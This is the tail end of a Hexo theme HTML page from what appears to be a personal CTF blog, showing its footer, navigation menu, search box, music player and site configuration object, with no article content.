+    <div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>【I hack,<span><i class='iconfont icon-like-fill'></i></span>therefore I am.】</div><div>&copy; 2024-2026 debu8ger. All Rights Reserved.</div>
+</div>
+    <div id="sidebar">
+    <div class="menu-wrap" style="display:none;">
+        
+            <div class="menu-notice">
+                <span class="iconfont icon-notice"></span>
+                <div class="notice">
+                    <span>Bonjour, 欢迎来到debu8gerのCTF小站！</span>
+                </div>
+            </div>
+        
+        <nav class="menu">
+            <div class="menu-introduce"> 
+                <div class="introduce-avatar">
+                    <img src="/static/avatar/avatar0.jpg">
+                </div> 
+                <div class="introduce-info"> 
+                    <div class="introduce-user">
+                        
+                            <a href="https://incldue.github.io/" target="_blank"><span>D'b8Gr</span></a>
+                        
+                    </div>
+                </div> 
+            </div> 
+            <div class="menu-list">
+                <ul>
+                    
+                        <li class=""><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
+                    
+                        <li class=""><a href="/category" class="" target="_self"><span class="iconfont icon-folder-fill"></span>分类</a></li>
+                    
+                        <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
+                    
+                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
+                    
+                        <li class=""><a href="/about" class="" target="_self"><span class="iconfont icon-about-fill"></span>关于</a></li>
+                    
+                        <li class=""><a href="/atom.xml" class="" target="_blank"><span class="iconfont icon-rss"></span>订阅</a></li>
+                    
+                        <li class=""><a href="javascript:;" class="search" target="_self"><span class="iconfont icon-search-menu"></span>搜索</a></li>
+                    
+                        <li class=""><a href="/comment" class="" target="_self"><span class="iconfont icon-comments-fill"></span>留言板</a></li>
+                    
+                        <li class=""><a href="/friend" class="" target="_self"><span class="iconfont icon-link"></span>友情链接</a></li>
+                    
+                </ul> 
+            </div> 
+            <div class="menu-link">
+                <div class="box">
+                    <div class="image-box"></div>
+                </div>
+                
+                    <a name="QQ" href="524633948@qq.com" class="" target="_blank" data=""><span class="iconfont icon-qq"></span></a>
+                
+                    <a name="Twitter" href="https://x.com/JonathanHu70782" class="" target="_blank" data=""><span class="iconfont icon-twitter"></span></a>
+                
+                    <a name="email" href="mailto:52463398@outlook.com" class="" target="_self" data=""><span class="iconfont icon-email"></span></a>
+                
+                    <a name="GitHub" href="https://github.com/incldue" class="" target="_blank" data=""><span class="iconfont icon-github"></span></a>
+                
+            </div> 
+        </nav>
+        <button class="menu-button-close"></button>
+        <div class="morph-shape" id="morph-shape" data-morph-open="M-7.312,0H15c0,0,66,113.339,66,399.5C81,664.006,15,800,15,800H-7.312V0z;M-7.312,0H100c0,0,0,113.839,0,400c0,264.506,0,400,0,400H-7.312V0z">
+            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none">
+                <path d="M-7.312,0H0c0,0,0,113.839,0,400c0,264.506,0,400,0,400h-7.312V0z"/>
+            </svg>
+        </div>
+    </div>
+    <button class="menu-button-open">MENU</button>
+    <div class="menu-cover"></div>
+</div>
+    <link type="text/css" rel="stylesheet" href="/css/search.css">
+<script type="text/javascript" src="/js/iscroll.js"></script>
+<script type="text/javascript" src="/js/instantsearch.min.js"></script>
+<div class="search-window">
+    <div class="search-content">
+        <div class="search-content-icon">
+            <i class="iconfont icon-search"></i>
+        </div>
+        <div id="search-input" class="search-input"></div>
+    </div>
+
+    <div class="search-scroll">
+        <div class="search-result">
+            <div id="search-stats" class="search-stats"></div>
+            <div id="search-hits"></div>
+            <div id="search-pagination" class="search-pagination"></div>
+        </div>
+    </div>
+
+    <span class="search-close-icon">
+        <i class="iconfont icon-close"></i>
+    </span>
+</div>
+    <div id="tools">
+    <div class="progressbar-top"></div>
+    
+    <link type="text/css" rel="stylesheet" href="/css/APlayer.css">
+    <script type="text/javascript" src="/js/APlayer.min.js"></script>
+    <script type="text/javascript" src="/js/Meting.min.js"></script>
+    <script>
+        var meting_api = 'https://api.i-meto.com/meting/api?server=:server&type=:type&id=:id&auth=:auth&r=:r';
+    </script>
+    <meting-js id="3778678" lrcshow="false" server="netease" type="playlist" fixed="true" autoplay="false" loop="all" order="random" preload="auto" volume="0.67" mutex="true"></meting-js>
+
+    <div class="wrap-right">
+    <div class="wrap-right-hide">
+         <div class="wrap-right-button favorites">
+            <div class="iconbox" switch="false">
+                <span class="iconfont icon-favorites"></span>
+            </div>
+            <span class="icontext">关注</span>
+         </div>
+        <div class="wrap-right-button search">
+            <div class="iconbox">
+                <span class="iconfont icon-search-menu"></span>
+            </div>
+            <span class="icontext">搜索</span>
+        </div>
+        <div class="wrap-right-button menu-button">
+            <div class="iconbox">
+                <span class="iconfont icon-menu"></span>
+            </div>
+            <span class="icontext">菜单</span>
+        </div>
+        <div class="wrap-right-button mode">
+            <div class="light">
+                <div class="iconbox">
+                    <span class="iconfont icon-daymode"></span>
+                </div>
+                <span class="icontext">浅色模式</span>
+            </div>
+            <div class="dark">
+                <div class="iconbox">
+                    <span class="iconfont icon-nightmode-fill"></span>
+                </div>
+                <span class="icontext">深色模式</span>
+            </div>
+        </div>
+        <div class="wrap-right-button bottom">
+            <div class="iconbox">
+                <span class="iconfont icon-top"></span>
+            </div>
+            <span class="icontext">跳至底部</span>
+        </div>
+    </div>
+    <div class="wrap-right-show">
+        <div class="wrap-right-button set">
+            <div class="iconbox">
+                <span class="iconfont icon-setting"></span>
+            </div>
+            <span class="icontext">设置</span>
+        </div>
+        <div class="wrap-right-button top">
+            <div class="iconbox">
+                <span class="iconfont icon-top"></span>
+            </div>
+            <span class="icontext">返回顶部</span>
+        </div>
+    </div>
+</div>
+    <div class="loading"></div>
+</div>
+    <script>
+    window.config = {
+        GitHubUserName     : "incldue",
+        GitHubRepositories : "incldue.github.io",
+
+        User             : "D'b8Gr",
+        UserAvatar       : "/static/avatar/avatar0.jpg",
+        WebsiteStartDate : "2025-06-01",
+        Home             : "https://incldue.github.io/",
+
+        WebsiteTitleBlur         : "(◍´ڡ`◍) Hi, there!",
+        WebsiteTitleBlurTimeOut  : 500,
+        WebsiteTitleFocus        : "(*´∇｀*) 欢迎回来!",
+        WebsiteTitleFocusTimeOut : 1000,
+        WebsiteFavicon           : {
+            light : "/static/avatar/avatar.png",
+            dark  : "/static/avatar/avatar.png"
+        },
+
+        ProgressBar : {
+            id       : "topProgressBar",
+            color    : "#77B6FF",
+            height   : "2px",
+            duration : 0.2
+        },
+
+        Loading: {
+            rebound : {
+                tension  : 16,
+                friction : 5
+            },
+            spinner : {
+                id     : "spinner",
+                radius : 90,
+                sides  : 3,
+                depth  : 4,
+                colors : {
+                    background : "#F0F0F0",
+                    stroke     : "#272633",
+                    base       : "",
+                    child      : "#272633"
+                },
+                alwaysForward : true,
+                restAt        : 0.5,
+                renderBase    : false
+            }
+        },
+
+        HomeHeaderAnimationRendered : true,
+        HomeHeaderAnimation         : {
+            radius      : 15,
+            density     : 0.2,
+            color       : "rgba(255, 255, 255, .2)",
+            clearOffset : 0.3
+        },
+
+        BackAnimationRendered          : true,
+        IEBrowserBackAnimationRendered : false,
+        BackAnimation                  : {
+            colorSaturation  : "60%",
+            colorBrightness  : "50%",
+            colorAlpha       : 0.5,
+            colorCycleSpeed  : 5,
+            verticalPosition : "random",
+            horizontalSpeed  : 200,
+            ribbonCount      : 3,
+            strokeSize       : 0,
+            parallaxAmount   : -0.2,
+            animateSections  : true
+        },
+
+        HomeHeaderImage : [
+            
+                "/static/bgimage/beach.png",
+            
+                "/static/bgimage/sky.png",
+            
+                "/static/bgimage/starrysky.png",
+            
+        ],
+        HomeBannerText  : "",
+
+        ArticleHeaderImage : [
+            
+                "/static/article.png",
+            
+        ],
+
+        OtherBannerText : "",
+
+        Error : {
+            icon    : "icon-swimming",
+            title   : "PAGE NOT FOUND",
+            content : [
+                
+                    "很抱歉，您访问的页面不存在！",
+                
+                    "可能是输入地址有误或该地址已变更。",
+                
+            ],
+            buttons : [
+                
+                    {
+                        icon  : "icon-home",
+                        text  : "返回首页",
+                        href  : "/",
+                        class : ""
+                    },
+                
+            ]
+        },
+
+        MenuNotice : {
+            enable : true,
+            notice : "Bonjour, 欢迎来到debu8gerのCTF小站！",
+            speed  : 20
+        },
+        MenuList : [
+            
+                {
+                    name   : "首页",
+                    icon   : "icon-home-fill",
+                    href   : "/",
+                    type   : "index",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "分类",
+                    icon   : "icon-folder-fill",
+                    href   : "/category",
+                    type   : "category",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "标签",
+                    icon   : "icon-discount-fill",
+                    href   : "/tag",
+                    type   : "tag",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "归档",
+                    icon   : "icon-calendar-fill",
+                    href   : "/archive",
+                    type   : "archive",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "关于",
+                    icon   : "icon-about-fill",
+                    href   : "/about",
+                    type   : "about",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "订阅",
+                    icon   : "icon-rss",
+                    href   : "/atom.xml",
+                    type   : "",
+                    class  : "",
+                    target : "_blank"
+                },
+            
+                {
+                    name   : "搜索",
+                    icon   : "icon-search-menu",
+                    href   : "javascript:;",
+                    type   : "",
+                    class  : "search",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "留言板",
+                    icon   : "icon-comments-fill",
+                    href   : "/comment",
+                    type   : "comment",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "友情链接",
+                    icon   : "icon-link",
+                    href   : "/friend",
+                    type   : "friend",
+                    class  : "",
+                    target : "_self"
+                },
+            
+        ],
+        MenuLink : [
+            
+                
+                    {
+                        name   : "QQ",
+                        icon   : "icon-qq",
+                        href   : "524633948@qq.com",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "Twitter",
+                        icon   : "icon-twitter",
+                        href   : "https://x.com/JonathanHu70782",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "email",
+                        icon   : "icon-email",
+                        href   : "mailto:52463398@outlook.com",
+                        class  : "",
+                        target : "_self",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "GitHub",
+                        icon   : "icon-github",
+                        href   : "https://github.com/incldue",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+            
+        ],
+
+        FooterStyle : 2,
+        BottomText  : "<div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>【I hack,<span><i class='iconfont icon-like-fill'></i></span>therefore I am.】</div><div>&copy; 2024-2026 debu8ger. All Rights Reserved.</div>",
+
+        ConsoleList : [
+            
+                
+                    [
+                        
+                            
+                                "Based on cnblogs theme SimpleMemory.",
+                            
+                                "",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "SimpleMemory Author:",
+                            
+                                "BNDong",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "Theme:",
+                            
+                                "LiveForCode",
+                            
+                        
+                    ],
+                
+            
+        ],
+
+        FontIconExtend : "",
+
+        Donate : {
+            paypal  : "",
+            bitcoin : "",
+            alipay  : "",
+            wechat  : ""
+        },
+
+        Search : {
+            applicationID : "010C3EANT8",
+            apiKey        : "c7abab9f11b79102b9aff7fe6d41447d",
+            indexName     : "Notes",
+            hits          : {
+                page : 10
+            },
+            labels        : {
+                placeholder : "搜索",
+                empty       : "未发现与 「${query}」 相关的内容",
+                stats       : "${hits} 条相关条目，使用了 ${time} 毫秒",
+            }
+        }, 
+
+        Comment : {
+            switch : true,
+            type   : "Waline",
+        },
+
+        Waline : {
+            el              : ".comments-content",
+            serverURL       : "https://waline-pi-blue-88.vercel.app/",
+            path            : window.location.pathname,
+            meta            : "['nick', 'mail', 'link']",
+            requiredMeta    : "['nick', 'mail']",
+            pageSize        : 10,
+            lang            : "zh-cn",
+            locale: {
+                admin       : "博主",
+                anonymous   : "匿名用户",
+                sofa        : "快来做第一个评论的人吧 ~",
+                placeholder : "你是我一生只会遇见一次的惊喜...",
+            },
+            dark            : "html[color-scheme='dark']",
+            search          : false,
+            pageview        : true,
+            comment         : true,
+            copyright       : false,
+        },
+
+        Valine : {
+            el             : ".comments-content",
+            appId          : "srhKtvWPQTWYKh3qX8G8M7v0-gzGzoHsz",
+            appKey         : "8uVSP1q6UlALVC5igYfIfv2h",
+            serverURLs     : "",
+            placeholder    : "你是我一生只会遇见一次的惊喜...",
+            avatar         : "mm",
+            meta           : "nick,mail,link",
+            requiredFields : "nick,mail",
+            pageSize       : 5,
+            lang           : "zh-cn",
+            visitor        : true,
+            enableQQ       : true
+        },
+
+        Tocbot : {
+            switch                : true,
+            tocSelector           : ".toc",
+            contentSelector       : ".article-body",
+            headingSelector       : "h1, h2, h3, h4, h5",
+            headingsOffset        : 0,
+            scrollSmooth          : true,
+            scrollSmoothOffset    : -5,
+            positionFixedSelector : ".toc",
+            positionFixedClass    : "toc-fixed",
+            fixedSidebarOffset    : "",
+        },
+
+        Require : {
+            baseUrl     : "/js/",
+            waitSeconds : 100
+        },
+
+        Music : {
+            type : "Meting"
+        },
+        APlayer : {
+            container : ".aplayer",
+            fixed     : true,
+            autoplay  : false,
+            loop      : "all",
+            order     : "random",
+            preload   : "auto",
+            volume    : 0.67,
+            mutex     : true,
+            lrcType   : 3,
+            audio     : [
+                
+                    {
+                        name   : "Endless Tears",
+                        artist : "CLIFF EDGE",
+                        cover  : "/music/cover/Endless Tears.jpg",
+                        url    : "/music/song/Endless Tears.mp3",
+                        lrc    : "/music/lrc/Endless Tears.lrc"
+                    },
+                
+            ]
+        },
+        Meting : {
+            api      : "https://api.i-meto.com/meting/api",
+            id       : "3778678", 
+            lrcshow  : false, 
+            server   : "netease", 
+            type     : "playlist", 
+            fixed    : true, 
+            autoplay : false, 
+            loop     : "all", 
+            order    : "random", 
+            preload  : "auto", 
+            volume   : 0.67, 
+            mutex    : true
+        },
+
+        Mouse : {
+            enable  : true,
+            options : {
+                size  : 6,
+                sizeF : 24
+            }
+        },
+
+        LazyLoad : {
+            default : "/image/website/lazyload.svg"
+        },
+  
+        Style : {
+            aplayer          : "/css/APlayer.css",
+            archive          : "/css/archive.css",
+            base             : "/css/base.css",
+            clipboard        : "/css/clipboard.css",
+            code             : "/css/code.css",
+            donate           : "/css/donate.css",
+            fancybox         : "/css/jquery.fancybox.css",
+            footer           : "/css/footer.css",
+            iconfont         : "/iconfont/iconfont.css",
+            index            : "/css/index.css",
+            menuBubble       : "/css/menu-bubble.css",
+            mouse            : "/css/mouse.css",
+            page             : "/css/page.css",
+            post             : "/css/post.css",
+            search           : "/css/search.css",
+            tocbot           : "/css/tocbot.css",
+            valine           : "/css/valine.css",
+            waline           : "/css/waline.css",
+            walineCustom     : "/css/waline-custom.css"
+        },
+
+        Script: {
+            aplayer          : "/js/APlayer.min.js",
+            config           : "/js/require.config.js",
+            index            : "/js/index.js",
+            instantSearch    : "/js/instantsearch.min.js",
+            iscroll          : "/js/iscroll.js",
+            jQuery           : "/js/jquery-3.4.1.min.js",
+            loading          : "/js/loading.js",
+            meting           : "/js/Meting.min.js",
+            require          : "/js/require.min.js",
+            waline           : "/js/waline.mjs",
+            pageview         : "/js/pageview.mjs",
+            comment          : "/js/comment.mjs",
+        },
+
+        Font: {
+            LongCang    : "/font/LongCang.css",
+            Monda       : "/font/Monda.css",
+            NotoSansSC  : "/font/NotoSansSC.css",
+            NotoSerifSC : "/font/NotoSerifSC.css",
+            Playball    : "/font/Playball.css",
+            PTMono      : "/font/PTMono.css",
+            Roboto      : "/font/Roboto.css",
+            RobotoSlab  : "/font/RobotoSlab.css",
+            Rosario     : "/font/Rosario.css",
+            UbuntuMono  : "/font/UbuntuMono.css"
+        },
+
+        Suffix : {
+            about : "I hack,therefore I am."
+        },
+            
+        Theme : {
+            url  : "https://github.com/first19326/Hexo-LiveForCode",
+            name : "Hexo - Live For Code"
+        }  
+    };
+</script>
+    <script type="text/javascript" src="/js/index.js"></script>
+</body>
+</html>
